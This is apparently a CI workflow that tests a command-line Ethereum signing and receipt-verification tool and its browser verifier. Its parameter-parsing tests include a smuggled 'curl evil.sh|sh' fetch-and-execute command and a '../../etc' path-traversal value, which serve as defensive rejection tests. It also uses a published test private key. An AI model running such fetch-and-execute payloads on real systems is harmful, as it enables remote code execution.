name: selftest

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  dogfood:
    runs-on: ubuntu-latest
    env:
      # Well-known public test key (all 0x46 bytes). Safe to expose: it is a
      # published test vector, not a real key.
      ETHKEY_PK: "0x4646464646464646464646464646464646464646464646464646464646464646"
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - uses: actions/setup-node@v4
        with:
          node-version: "20"

      - name: Install dependency
        run: pip install pycryptodome

      - name: Run built-in selftest
        run: python3 ethkey.py selftest

      - name: Sign / recover round-trip
        run: |
          set -euo pipefail
          MSG='CI roundtrip'
          SIG=$(python3 ethkey.py sign "$MSG")
          echo "signature: $SIG"
          ADDR=$(python3 ethkey.py address "$ETHKEY_PK")
          echo "address: $ADDR"
          # recover exits 0 when the claimed address matches, 1 when it does not
          python3 ethkey.py recover "$ADDR" "$MSG" "$SIG"
          # negative control: recovering against a wrong address must fail (exit 1)
          if python3 ethkey.py recover "0x0000000000000000000000000000000000000000" "$MSG" "$SIG"; then
            echo "FAIL: recover matched a wrong address"
            exit 1
          fi
          echo "round-trip and negative control OK"

      - name: Cross-check signatures against ethers.js v6
        run: |
          set -euo pipefail
          MSG='CI roundtrip'
          SIG=$(python3 ethkey.py sign "$MSG")
          ADDR=$(python3 ethkey.py address "$ETHKEY_PK")
          SCRATCH=$(mktemp -d)
          cd "$SCRATCH"
          npm init -y >/dev/null
          npm install ethers@6 --no-audit --no-fund >/dev/null
          node -e 'const { ethers } = require("ethers");
            const [msg, sig, addr] = process.argv.slice(1);
            const recovered = ethers.verifyMessage(msg, sig);
            console.log("ethers.verifyMessage:", recovered);
            if (recovered.toLowerCase() !== addr.toLowerCase()) {
              console.error("FAIL: ethers recovered", recovered, "expected", addr);
              process.exit(1);
            }
            console.log("ethers.js v6 cross-check OK");' "$MSG" "$SIG" "$ADDR"

      - name: Signed proof round-trip + ethers cross-check
        run: |
          set -euo pipefail
          python3 ethkey.py proof --file ethkey.py --note "CI proof" --out proof.md
          ADDR=$(python3 ethkey.py address "$ETHKEY_PK")
          python3 ethkey.py verify proof.md --require "$ADDR"
          # negative control: tamper with payload -> verify must exit 1
          python3 - <<'EOF'
          import re, subprocess, sys
          md = open('proof.md').read()
          m = re.search(r'-----BEGIN PAYLOAD-----\n(.*?)-----END PAYLOAD-----', md, re.S)
          body = m.group(1).replace('\n', '')
          body = body[:-4] + ('A' if body[-1] != 'A' else 'B') + body[-4:]
          open('proof.md','w').write(md.replace(m.group(1), body))
          EOF
          if python3 ethkey.py verify proof.md; then
            echo "FAIL: tampered proof verified"
            exit 1
          fi
          # ethers cross-check of the untampered signature over the canonical string
          rm proof.md
          python3 ethkey.py proof --file ethkey.py --note "CI proof" --out proof.md
          PROOF=$PWD/proof.md
          SCRATCH=$(mktemp -d)
          cd "$SCRATCH"
          npm init -y >/dev/null
          npm install ethers@6 --no-audit --no-fund >/dev/null
          node -e 'const { ethers } = require("ethers");
            const fs = require("fs");
            const md = fs.readFileSync(process.argv[1], "utf8");
            const g = (k) => md.match(new RegExp("^" + k + ": (.+)$", "m"))[1].trim();
            const canon = `ethkey-lite-proof v1\ncreated:${g("created")}\nsha256:${g("sha256")}`;
            const rec = ethers.verifyMessage(canon, g("signature"));
            console.log("ethers proof signer:", rec);
            if (rec.toLowerCase() !== g("signer").toLowerCase()) {
              console.error("FAIL: ethers proof signer mismatch");
              process.exit(1);
            }
            console.log("ethers proof cross-check OK");' "$PROOF"

      - name: Documented CLI surfaces (new/checksum/ENVKEY_PK-refusal/all-receipts)
        run: |
          set -euo pipefail
          # README: `new` = "fresh keypair (stdout only)" and "writes nothing
          # to disk" — pin BOTH halves of that claim (c22 audit gap #3).
          DIRTY_BEFORE=$(git status --porcelain)
          NEWOUT=$(python3 ethkey.py new)
          PK=$(echo "$NEWOUT" | grep '^private_key_hex:' | sed 's/private_key_hex: //')
          echo "$PK" | grep -qE '^0x[0-9a-f]{64}$' || { echo "FAIL: pk not 0x+64hex"; exit 1; }
          [ "$(git status --porcelain)" = "$DIRTY_BEFORE" ] || { echo "FAIL: 'new' touched the worktree"; exit 1; }
          echo "OK: new -> well-formed pk, zero disk writes"
          # README: `checksum` CLI subcommand — pin the CLI WIRING (not just
          # the lib fn) against the canonical EIP-55 mixed-case vectors
          # (c22 audit gap #5).
          [ "$(python3 ethkey.py checksum 0x5aaeb6053f3e94c9b8a09fbc64729cb422580706)" = "0x5aAeb6053f3E94C9B8A09FbC64729CB422580706" ] || { echo "FAIL: EIP-55 vector 1"; exit 1; }
          [ "$(python3 ethkey.py checksum 0xfd4090e27c1f946ff01a265caa7d4aca662acc15)" = "0xFD4090e27C1f946Ff01a265cAa7d4ACA662acC15" ] || { echo "FAIL: EIP-55 vector 2"; exit 1; }
          echo "OK: checksum CLI matches EIP-55 spec vectors"
          # README: key via ETHKEY_PK env "never appears in argv" — pin the
          # REFUSAL branch: no env -> clean exit 2 naming ETHKEY_PK, no
          # traceback (c22 audit gap #6).
          set +e
          ERR=$(env -u ETHKEY_PK python3 ethkey.py sign hello 2>&1 >/dev/null); code=$?
          set -e
          [ "$code" -eq 2 ] || { echo "FAIL: sign-without-env exited $code, expected 2"; exit 1; }
          case "$ERR" in *Traceback*) echo "FAIL: sign-without-env traceback"; exit 1;; esac
          case "$ERR" in *ETHKEY_PK*) ;; *) echo "FAIL: error doesn't name ETHKEY_PK"; exit 1;; esac
          echo "OK: sign without ETHKEY_PK -> exit 2, names the var, no traceback"
          # README: 'Every release ships a signed receipt' — every
          # version-named receipt in proofs/ must verify against the C signer
          # via the CLI, not just the JS core (c22 audit gaps #11/#12: v0.4
          # was JS-only, v0.6 was never read by any step).
          C_ADDR=0xf232dcdc177b53981b4d805a48c79f239db8d0f9
          N=0
          for f in proofs/v*.md; do
            python3 ethkey.py verify "$f" --require "$C_ADDR" >/dev/null
            N=$((N+1)); echo "OK: $f verifies via CLI --require"
          done
          [ "$N" -ge 4 ] || { echo "FAIL: only $N version receipts found (expected >=4)"; exit 1; }
          echo "OK: all $N version receipts pass CLI --require"

      - name: Doc surface pins (README fence quote-clean, sitemap/robots, link liveness)
        run: |
          set -euo pipefail
          # Gap #16: the README's OWN yaml fence must model the quoting rule it
          # preaches — every `require:` inside a fenced block carries quotes.
          python3 - <<'EOF'
          import re, sys
          src = open('README.md').read()
          blocks = re.findall(r'^```(?:yaml|yml)\n(.*?)^```', src, re.M | re.S)
          bad = []
          for b in blocks:
              for line in b.splitlines():
                  m = re.search(r'require:\s*(\S+)', line)
                  if m and not re.match(r'^["\']', m.group(1)):
                      bad.append(line.strip())
          assert bad == [], 'unquoted require: in README fence(s): ' + repr(bad)
          assert any('require:' in b for b in blocks), 'no require: example in any yaml fence'
          print(f'OK: {len(blocks)} yaml fences scanned, every require: quoted')
          EOF
          # Gap #26: robots must name the sitemap; every sitemap <loc> must
          # resolve 200 on the live Pages host AND map to a committed file.
          BASE=https://tianzhicdev.github.io/ethkey-lite
          grep -q "^Sitemap: ${BASE}/sitemap.xml" robots.txt || { echo 'FAIL: robots missing sitemap'; exit 1; }
          grep -oP '(?<=<loc>)[^<]+' sitemap.xml | while read -r L; do
            code=$(curl -s -o /dev/null -w '%{http_code}' "$L")
            [ "$code" = "200" ] || { echo "FAIL: sitemap loc $L -> $code"; exit 1; }
            P="${L#$BASE/}"; [ -z "$P" ] && P=index.html
            [ -f "$P" ] || { echo "FAIL: sitemap loc $L has no committed file $P"; exit 1; }
            echo "OK: sitemap loc live + file present ($P)"
          done
          # Gap #31: every EXTERNAL href on the three Pages surfaces must be
          # alive (dead outbound links are the cheapest trust leak to catch).
          for U in $(grep -ohE 'href="https?://[^"]+"' index.html receipt.html verify.html \
                       | sed -e 's/^href="//' -e 's/"$//' -e 's/&amp;/\&/g' | sort -u); do
            code=$(curl -s -o /dev/null -w '%{http_code}' -L "$U")
            [ "$code" = "200" ] || { echo "FAIL: outbound link $U -> $code"; exit 1; }
            echo "OK: outbound $U"
          done

      - name: CLI argument validation (no tracebacks, documented exit codes)
        run: |
          set -euo pipefail
          # help flags must print help and exit 0 (never crash)
          for a in "--help" "-h" "verify --help" "verify -h" "proof --help"; do
            python3 ethkey.py $a >/dev/null
          done
          # option flag with no value -> exit 2 with a clean error, no traceback
          for a in "proof hello --out" "verify nope.md --require"; do
            set +e
            ERR=$(python3 ethkey.py $a 2>&1 >/dev/null); code=$?
            set -e
            [ "$code" -eq 2 ] || { echo "FAIL: '$a' exited $code, expected 2"; exit 1; }
            case "$ERR" in *Traceback*) echo "FAIL: '$a' printed a traceback"; exit 1;; esac
            echo "OK: '$a' -> exit 2, no traceback"
          done
          # missing file -> exit 1 with clean error, no traceback
          set +e
          ERR=$(python3 ethkey.py verify no-such-file.md 2>&1 >/dev/null); code=$?
          set -e
          [ "$code" -eq 1 ] || { echo "FAIL: missing file exited $code, expected 1"; exit 1; }
          case "$ERR" in *Traceback*) echo "FAIL: missing file printed a traceback"; exit 1;; esac
          echo "OK: missing file -> exit 1, no traceback"

      - name: Duplicate-header-field forgery matrix (first-wins parse audit)
        run: |
          set -euo pipefail
          # First-wins setdefault parse must never let a FORGED duplicate of a
          # signed field (inserted BEFORE the authentic line) verify, and
          # benign accidental duplication (authentic first) must keep passing.
          # Run against the committed fixture (signed with throwaway pk=2).
          python3 - <<'EOF'
          import importlib.util, sys
          spec = importlib.util.spec_from_file_location('ek', 'ethkey.py')
          ek = importlib.util.module_from_spec(spec); spec.loader.exec_module(ek)
          good = open('proofs/c12-dup-field-fixture.md').read()
          FORGED = {'created': '2020-01-01T00:00:00Z', 'sha256': '0'*64,
                    'signer': '0x' + 'ab'*20, 'signature': '0x' + '11'*65}
          def ins(md, f, v, before=True):
              L = md.splitlines(); i = next(j for j,l in enumerate(L) if l.startswith(f+':'))
              L.insert(i if before else i+1, f + ': ' + v if before else L[i]); return '\n'.join(L)+'\n'
          fails = 0
          for f, v in FORGED.items():
              ok, _, r = ek.verify_proof(ins(good, f, v))
              print(('PASS' if not ok else 'FAIL') + f' | forged-{f}-first | {r}')
              fails += ok
          for f in FORGED:
              ok, _, r = ek.verify_proof(ins(good, f, None, before=False))
              print(('PASS' if ok else 'FAIL') + f' | benign-dup-{f}-after | {r}')
              fails += not ok
          ok, _, r = ek.verify_proof(good)
          print(('PASS' if ok else 'FAIL') + ' | control-untouched')
          fails += not ok
          sys.exit(1 if fails else 0)
          EOF

      - name: Negative-control fixtures (forged signer + throwaway key)
        run: |
          set -euo pipefail
          # Attack-class regression (c18): a receipt with a VALID signature by
          # a throwaway key and a FORGED signer header must fail --require for
          # every fleet trust anchor; a genuine throwaway-key receipt must pass
          # WITHOUT require (signature layer honest) and fail WITH require
          # (anchor layer honest). Proves neither layer passes fail-open.
          python3 - <<'EOF'
          import importlib.util, sys
          spec = importlib.util.spec_from_file_location('ek', 'ethkey.py')
          ek = importlib.util.module_from_spec(spec); spec.loader.exec_module(ek)
          C = '0xf232dcdc177b53981b4d805a48c79f239db8d0f9'
          A = '0xfd4090e27c1f946ff01a265caa7d4aca662acc15'
          forged = open('proofs/c18-forged-signer-fixture.md').read()
          threw = open('proofs/c18-throwaway-signed-fixture.md').read()
          THREW_ADDR = '0x6813eb9362372eef6200f3b1dbc3f819671cba69'
          fails = 0
          def T(name, cond, d=''):
              global fails
              print(('PASS' if cond else 'FAIL') + ' | ' + name + ((' | ' + d) if not cond and d else ''))
              fails += not cond
          # verify_proof has NO require param (require is the CLI layer); the
          # anchor assertion here is: recovered signer == required addr.
          def req_check(md, req):
              ok, signer, r = ek.verify_proof(md)
              return ok and signer and signer.lower() == req.lower(), r
          # forged-signer fixture: header claims C, recovery says throwaway key.
          for req in (C, A):
              ok, r = req_check(forged, req)
              T(f'forged rejected (require={req})', not ok, r)
          ok, signer, r = ek.verify_proof(forged)
          T('forged rejected bare too (header!=recovered, header cannot override)', not ok, r)
          T('forged: recovered addr IS the throwaway key (recovery is source of truth)',
            signer and signer.lower() == THREW_ADDR, str(signer))
          # throwaway fixture: honest sig+header, wrong signer -> passes bare,
          # fails any fleet-anchor require
          ok, signer, r = ek.verify_proof(threw)
          T('throwaway-key receipt passes WITHOUT require (sig layer honest)', ok, r)
          for req in (C, A):
              ok, r = req_check(threw, req)
              T(f'throwaway rejected (require={req})', not ok, r)
          sys.exit(1 if fails else 0)
          EOF

      - name: In-repo composite action (run block extracted VERBATIM from action.yml)
        run: |
          set -euo pipefail
          # The README tells in-repo consumers the composite at
          # ./.github/actions/verify-release works. Nothing else in CI EXECUTES
          # that composite's own step script — path resolution
          # (GITHUB_ACTION_PATH/../../..), the sed signer-output parse, and the
          # fail-closed grep were all untested surface. Extract the EXACT bytes
          # from action.yml (no copy-paste drift possible) and run them against
          # the real env contract (GITHUB_ACTION_PATH, GITHUB_OUTPUT, RECEIPT,
          # REQUIRE): one positive + two refusals.
          python3 - <<'EOF'
          import re, sys
          # Pure-stdlib extraction (runner has pycryptodome only, NO PyYAML —
          # a `yaml` import here ModuleNotFoundError'd on the first live run).
          # Indent-based: find id: verify in runs.steps, capture its run: |
          # block (all deeper-indented lines, dedented to block indent).
          src = open('.github/actions/verify-release/action.yml').read().splitlines()
          vi = next(i for i, l in enumerate(src) if re.match(r'\s+id:\s*verify\s*$', l))
          ri = next(i for i in range(vi, len(src)) if re.match(r'\s+run:\s*\|\s*$', src[i]))
          bindent = len(src[ri]) - len(src[ri].lstrip())
          body, cur = [], bindent + 2
          for l in src[ri + 1:]:
              if l.strip() and (len(l) - len(l.lstrip())) <= bindent:
                  break
              body.append(l[cur:] if len(l) > cur else l.lstrip())
          text = '\n'.join(body)
          assert 'set -euo pipefail' in text and 'GITHUB_ACTION_PATH' in text, \
              'extraction sanity: not the verify step body'
          assert text.count('grep') == 1 and "grep -q 'result: OK'" in text, \
              'extraction sanity: fail-closed grep missing'
          open('composite-run.sh', 'w').write(text)
          print(f'extracted {len(text)} bytes of composite run block verbatim')
          EOF
          C_ADDR=0xf232dcdc177b53981b4d805a48c79f239db8d0f9
          run_case () { # $1=receipt $2=require $3=expected-exit $4=label
            local out; out=$(mktemp)
            set +e
            GITHUB_ACTION_PATH="$PWD/.github/actions/verify-release" \
            GITHUB_OUTPUT="$out" RECEIPT="$1" REQUIRE="$2" \
            bash composite-run.sh > step.log 2>&1
            local code=$?
            set -e
            [ "$code" -eq "$3" ] || { echo "FAIL[$4]: exit $code, expected $3"; cat step.log; exit 1; }
            echo "OK[$4]: exit $code"
            printf '%s\n' "$4 OUT:"; cat step.log
            printf '%s\n' "$4 GITHUB_OUTPUT:"; cat "$out"
            rm -f "$out"
          }
          # positive: real v0.7 receipt + C anchor -> exit 0 AND the action's
          # declared `signer` output line is written with the right address.
          out=$(mktemp)
          GITHUB_ACTION_PATH="$PWD/.github/actions/verify-release" \
          GITHUB_OUTPUT="$out" RECEIPT="proofs/v0.7-verify-workflow.md" REQUIRE="$C_ADDR" \
          bash composite-run.sh > step.log 2>&1
          grep -qi "^signer=$C_ADDR$" "$out" || { echo 'FAIL[pos]: signer output line missing/wrong'; cat "$out"; exit 1; }
          grep -q 'result: OK' step.log || { echo 'FAIL[pos]: no result: OK'; exit 1; }
          echo 'OK[pos]: composite verified v0.7 receipt + published signer output'; rm -f "$out"
          # negative 1: c18 forged-signer fixture -> composite fails (exit != 0)
          run_case proofs/c18-forged-signer-fixture.md "$C_ADDR" 1 'forged fixture refused'
          # negative 2: nonexistent receipt -> still fails CLOSED (no crash-open,
          # the grep on 'result: OK' can only pass on a real verification)
          run_case no-such-receipt.md "$C_ADDR" 1 'missing receipt fails closed'

      - name: receipt.html core logic tests (browser verifier vs CLI semantics)
        run: |
          set -euo pipefail
          SCRATCH=$(mktemp -d); cd "$SCRATCH"
          npm init -y >/dev/null
          npm install ethers@6 --no-audit --no-fund >/dev/null
          cat > t.mjs <<'EOF'
          import fs from 'fs';
          import nodeCrypto from 'node:crypto';
          import { verifyMessage } from 'ethers';
          if (!globalThis.crypto) globalThis.crypto = nodeCrypto.webcrypto;
          const REPO = process.argv[2];
          const html = fs.readFileSync(REPO + '/receipt.html', 'utf8');
          const m = html.match(/\/\/ ---- CORE BEGIN ----[^\n]*\n([\s\S]*?)\/\/ ---- CORE END ----/);
          if (!m) { console.error('CORE block not found in receipt.html'); process.exit(1); }
          globalThis.ethers = { verifyMessage };
          const core = new Function(m[1] + '; return { verifyReceipt, verKey, sortVersionedDesc, parseParams, isReceiptName, FLEET };')();
          const good = fs.readFileSync(REPO + '/proofs/v0.4-source.md', 'utf8');
          let fails = 0;
          const T = (n, c, d) => { console.log((c ? 'PASS' : 'FAIL') + ' | ' + n + (d && !c ? ' | ' + d : '')); if (!c) fails++; };
          // fleet trust anchors (c16 fleet board): pinned addresses copied from
          // the team ledger — a silent swap in the page must be a CI failure.
          {
            T('FLEET: exactly 4 repos', core.FLEET.length === 4 && core.FLEET.map(f => f.repo).join(',') === 'ethkey-lite,secretgate,hookpack,secretgate-action', core.FLEET.map(f => f.repo).join(','));
            T('FLEET: C addr pinned', core.FLEET.find(f => f.repo === 'ethkey-lite').signer === '0xf232dcdc177b53981b4d805a48c79f239db8d0f9');
            T('FLEET: A addr pinned x3', core.FLEET.filter(f => f.signer === '0xfd4090e27c1f946ff01a265caa7d4aca662acc15').map(f => f.repo).sort().join(',') === 'hookpack,secretgate,secretgate-action');
            T('FLEET: all signers well-formed', core.FLEET.every(f => /^0x[0-9a-f]{40}$/.test(f.signer)));
            T('isReceiptName: receipts in, fixtures out',
              core.isReceiptName('v0.7-verify-workflow.md') && core.isReceiptName('summarize-v1.2.1-proof.md') &&
              !core.isReceiptName('c12-dup-field-fixture.md') && !core.isReceiptName('README.md') && !core.isReceiptName('v1.2-guide.txt'));
          }
          // deep-link param parsing (c14: ?load=latest&require=0x… — URL is untrusted input; c16: +repo allowlist)
          {
            const pp = (q) => core.parseParams(new URLSearchParams(q));
            let d = pp('load=latest&require=0xf232Dcdc177b53981b4D805A48C79F239DB8D0F9');
            T('params: load=latest + valid require', d.load === true && d.require === '0xf232Dcdc177b53981b4D805A48C79F239DB8D0F9' && d.badRequire === false, JSON.stringify(d));
            d = pp('require=0xf232dcdc177b53981b4d805a48c79f239db8d0f9');
            T('params: require only, no load', d.load === false && d.require === '0xf232dcdc177b53981b4d805a48c79f239db8d0f9', JSON.stringify(d));
            d = pp('require=0x123');
            T('params: short require rejected as badRequire', d.require === '' && d.badRequire === true, JSON.stringify(d));
            d = pp('require=0xzz32dcdc177b53981b4d805a48c79f239db8d0f9');
            T('params: non-hex require rejected', d.require === '' && d.badRequire === true, JSON.stringify(d));
            d = pp('require=0xf232dcdc177b53981b4d805a48c79f239db8d0f9;curl evil.sh|sh');
            T('params: injection-shaped require rejected', d.require === '' && d.badRequire === true, JSON.stringify(d));
            d = pp('load=1');
            T('params: load!=latest ignored', d.load === false, JSON.stringify(d));
            d = pp('');
            T('params: empty query is no-op', d.load === false && d.require === '' && d.badRequire === false, JSON.stringify(d));
            d = pp('load=latest&repo=secretgate-action');
            T('params: allowed repo honored', d.load === true && d.repo === 'secretgate-action' && d.badRepo === false, JSON.stringify(d));
            d = pp('load=latest&repo=evil-repo');
            T('params: unknown repo refused, nothing loaded', d.repo === '' && d.badRepo === true, JSON.stringify(d));
            d = pp('repo=../../etc');
            T('params: path-shaped repo refused', d.repo === '' && d.badRepo === true, JSON.stringify(d));
            d = pp('repo=');
            T('params: empty repo is no-op', d.repo === '' && d.badRepo === false, JSON.stringify(d));
            // c20 mismatch rule: repo+require must AGREE with the pinned FLEET
            // table or the whole pair is refused (nothing prefilled, nothing auto-runs).
            d = pp('load=latest&repo=secretgate&require=0xFD4090e27C1f946Ff01a265cAa7d4ACA662acC15');
            T('params: matching repo+require pair honored (case-insensitive)',
              d.repo === 'secretgate' && d.require === '0xFD4090e27C1f946Ff01a265cAa7d4ACA662acC15' &&
              d.badMismatch === false && d.badRepo === false && d.badRequire === false, JSON.stringify(d));
            d = pp('load=latest&repo=secretgate&require=0xf232dcdc177b53981b4d805a48c79f239db8d0f9');
            T('params: mismatched repo+require refused (C addr on A repo)',
              d.badMismatch === true && d.badRepo === false && d.badRequire === false, JSON.stringify(d));
            d = pp('require=0xfd4090e27c1f946ff01a265caa7d4aca662acc15&repo=ethkey-lite');
            T('params: reversed mismatch refused too', d.badMismatch === true, JSON.stringify(d));
            d = pp('require=0xf232dcdc177b53981b4d805a48c79f239db8d0f9&repo=evil');
            T('params: bad repo + valid require = badRepo only, no mismatch',
              d.badRepo === true && d.badMismatch === false && d.require !== '', JSON.stringify(d));
            d = pp('require=0xf232dcdc177b53981b4d805a48c79f239db8d0f9');
            T('params: require alone never trips mismatch', d.badMismatch === false, JSON.stringify(d));
          }
          // version-sort unit tests (c13: loadSample resolves tags/files by these)
          {
            const sv = core.sortVersionedDesc(['v0.4-a.md', 'v0.10-a.md', 'v0.9-a.md', 'v0.10.2-a.md', 'fixture-no-ver.md']);
            T('sort: v0.10.2 > v0.10 > v0.9 > v0.4 > no-version',
              sv.join(',') === 'v0.10.2-a.md,v0.10-a.md,v0.9-a.md,v0.4-a.md,fixture-no-ver.md', sv.join(','));
            const k = core.verKey('c12-dup-field-fixture.md');
            T('verKey: no vX.Y keys as [0,0,0]', k.join() === '0,0,0', k.join());
          }
          const has = (r, n) => r.checks.some(c => c.name === n && c.ok);
          const no  = (r, n) => r.checks.some(c => c.name === n && !c.ok);
          let r = await core.verifyReceipt(good, '');
          T('valid receipt ok', r.ok && !no(r,'payload') && !no(r,'signature') && !no(r,'signer'), JSON.stringify(r.checks));
          r = await core.verifyReceipt(good, '0xf232Dcdc177b53981b4D805A48C79F239DB8D0F9');
          T('require correct addr ok', r.ok && has(r,'require'));
          r = await core.verifyReceipt(good, '0x0000000000000000000000000000000000000000');
          T('require wrong addr rejected', !r.ok && no(r,'require'));
          const lines = good.split('\n');
          const bi = lines.findIndex(l => l.trim() === '-----BEGIN PAYLOAD-----');
          lines[bi + 1] = 'ZQ==' + lines[bi + 1].slice(4);
          r = await core.verifyReceipt(lines.join('\n'), '');
          T('tampered payload rejected', !r.ok && no(r,'payload'));
          r = await core.verifyReceipt(good.replace(/^signer: .*/m, 'signer: 0x0000000000000000000000000000000000000000'), '');
          T('signer header swap rejected', !r.ok && no(r,'signer'));
          r = await core.verifyReceipt('not a receipt', '');
          T('garbage rejected without crashing', !r.ok);
          // duplicate-field parity with python matrix (c12): forged-first must fail,
          // benign duplicate-after must pass, on the committed fixture.
          const fx = fs.readFileSync(REPO + '/proofs/c12-dup-field-fixture.md', 'utf8');
          const FORGED = { created: '2020-01-01T00:00:00Z', sha256: '0'.repeat(64),
                           signer: '0x' + 'ab'.repeat(20), signature: '0x' + '11'.repeat(65) };
          const ins = (md, f, v, before) => { const L = md.split('\n');
            const i = L.findIndex(l => l.startsWith(f + ':'));
            L.splice(before ? i : i + 1, 0, before ? f + ': ' + v : L[i]); return L.join('\n'); };
          for (const [f, v] of Object.entries(FORGED)) {
            const q = await core.verifyReceipt(ins(fx, f, v, true), '');
            T('forged-' + f + '-first rejected', !q.ok);
          }
          for (const f of Object.keys(FORGED)) {
            const q = await core.verifyReceipt(ins(fx, f, null, false), '');
            T('benign-dup-' + f + '-after accepted', q.ok);
          }
          // negative-control fixtures (c18, python matrix parity): a VALID
          // throwaway-key signature with a forged C-wallet signer header must
          // make the PAGE fail too — signature layer honest, header cannot
          // override recovery, and no fleet anchor accepts either fixture.
          {
            const CADDR = '0xf232dcdc177b53981b4d805a48c79f239db8d0f9';
            const AADDR = '0xfd4090e27c1f946ff01a265caa7d4aca662acc15';
            const forgedFx = fs.readFileSync(REPO + '/proofs/c18-forged-signer-fixture.md', 'utf8');
            const threwFx = fs.readFileSync(REPO + '/proofs/c18-throwaway-signed-fixture.md', 'utf8');
            T('c18: fixtures excluded from receipt-name sort', !core.isReceiptName('c18-forged-signer-fixture.md') && !core.isReceiptName('c18-throwaway-signed-fixture.md'));
            let q = await core.verifyReceipt(forgedFx, CADDR);
            T('c18 page: forged signer+require rejected', !q.ok && no(q, 'signer') && no(q, 'require'), JSON.stringify(q.checks));
            q = await core.verifyReceipt(forgedFx, AADDR);
            T('c18 page: forged signer rejected vs A anchor', !q.ok && no(q, 'signer'));
            q = await core.verifyReceipt(forgedFx, '');
            T('c18 page: forged signer rejected WITHOUT require', !q.ok && no(q, 'signer'));
            q = await core.verifyReceipt(threwFx, '');
            T('c18 page: genuine throwaway-key receipt passes bare', q.ok, JSON.stringify(q.checks));
            q = await core.verifyReceipt(threwFx, CADDR);
            T('c18 page: throwaway-key receipt rejected vs C anchor', !q.ok && no(q, 'require') && !no(q, 'signature'));
            q = await core.verifyReceipt(threwFx, AADDR);
            T('c18 page: throwaway-key receipt rejected vs A anchor', !q.ok && no(q, 'require'));
          }
          console.log(fails ? fails + ' FAILURES' : 'receipt.html core OK');
          process.exit(fails ? 1 : 0);
          EOF
